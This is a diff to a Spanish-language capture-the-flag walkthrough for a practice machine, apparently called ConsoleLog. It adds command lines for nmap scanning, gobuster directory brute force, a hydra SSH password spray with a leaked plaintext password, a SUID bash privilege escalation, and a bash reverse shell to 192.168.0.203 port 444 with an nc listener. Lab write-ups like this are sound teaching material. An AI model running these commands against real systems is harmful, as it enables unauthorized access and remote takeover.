@@ -4,7 +4,7 @@ En esta lectura se documentara el paso a paso para resolver la maquina ConsoleLo
 
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image.png)
 
-Descargamos y desplegamos : 
+**Descargamos y desplegamos :** 
 
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image%201.png)
 
@@ -16,17 +16,29 @@ Con ping comprobamos que la misma esta activa, el TTL de 64 nos indica que es un
 
 Realizamos un escaneo con Nmap utilizando un Syn Scan, el cual es más rápido y discreto en entornos reales debido a que no completa el saludo de tres vías. Esto nos permite detectar puertos abiertos de manera eficiente sin establecer conexiones completas, reduciendo así la probabilidad de ser detectados.
 
+```jsx
+nmap -sS -p- --open -Pn -n --min-rate=5000 172.17.0.2
+```
+
 Encontramos abiertos los siguientes puertos : 
 
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image%203.png)
 
 Realizamos un nuevo escaneo con Nmap, esta vez enfocado únicamente en los puertos abiertos y utilizando el parámetro `-A`. Este parámetro ejecuta un conjunto de scripts de Nmap que permite identificar las versiones de los servicios y del sistema operativo en ejecución."
 
+```bash
+nmap -A -p 80,3000,5000 -Pn -n 172.17.0.2
+```
+
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image%204.png)
 
 Notamos que los primeros son dos paginas web http y el ultimo es ssh pero en un puerto no estándar
 
 Consultamos a la herramienta **`whatweb`** para ver con que tecnologías esta diseñada la web.
+
+```bash
+whatweb http::172.17.0.2
+```
 
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image%205.png)
 
@@ -50,7 +62,11 @@ Ingresamos al segundo puerto abierto para visualizar su contenido pero de moment
 
 Al hacer fuzzing encontramos el directorio backend con archivos útiles. Para esto use la herramienta `gobuster`.
 
-**Gobuster** es una herramienta de fuerza bruta utilizada para descubrir directorios, archivos, subdominios, y hosts virtuales ocultos en un servidor web. Funciona utilizando una lista de palabras (wordlist) para realizar solicitudes repetidas al servidor, lo que permite identificar recursos no visibles o no indexados. 
+**Gobuster** es una herramienta de fuerza bruta utilizada para descubrir directorios, archivos, subdominios, y hosts virtuales ocultos en un servidor web. Funciona utilizando una lista de palabras (wordlist) para realizar solicitudes repetidas al servidor, lo que permite identificar recursos no visibles o no indexados.
+
+```bash
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+```
 
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image%2010.png)
 
@@ -64,9 +80,17 @@ Encontramos este server.js que me da mucha curiosidad…
 
 esa contraseña en texto plano ahí ubicada es muy rara, tenemos un puerto con ssh abierto por lo que vamos a intentar averiguar con hydra si algún usuario la esta utilizando :
 
+```bash
+hydra -L /usr/share/wordlists/rockyou.txt -p password ssh://172.17.0.2:5000 -t 64
+```
+
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image%2013.png)
 
-Encontramos al usuario lovely con la contraseña conseguida porque estaba expuesta en texto plano.
+Encontramos al usuario lovely con la contraseña conseguida porque estaba expuesta en texto plano, por lo que nos conectamos mediante ssh al puerto indicado en el escaneo.
+
+```bash
+ssh lovely@172.17.0.2 -p 5000
+```
 
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image%2014.png)
 
@@ -94,11 +118,21 @@ La primera cambiarle los permiso a la bash con **`chmod u+s /bin/bash`**para que
 
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image%2019.png)
 
-La segunda es mandar una **shell** reversa a un puerto de nuestra maquina victima y ponernos en escucha con netcat a dicho puerto.
+La segunda es mandar una **shell** reversa a un puerto de nuestra maquina atacante y ponernos en escucha con netcat a dicho puerto.
+
+```bash
+bash -c 'bash -i >& /dev/tcp/192.168.0.203/444 0>&1'
+```
 
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image%2020.png)
 
-Esta es otra alternativa  pero se considera mas estable la primera.
+Desde nuestra maquina atacante usamos
+
+```bash
+nc -nlvp 444
+```
+
+**Esta es otra alternativa  pero se considera mas estable la primera.**
 
 ![image.png](Console%20Log%20c8effc909a3f432cb5e414be49210889/image%2021.png)
 
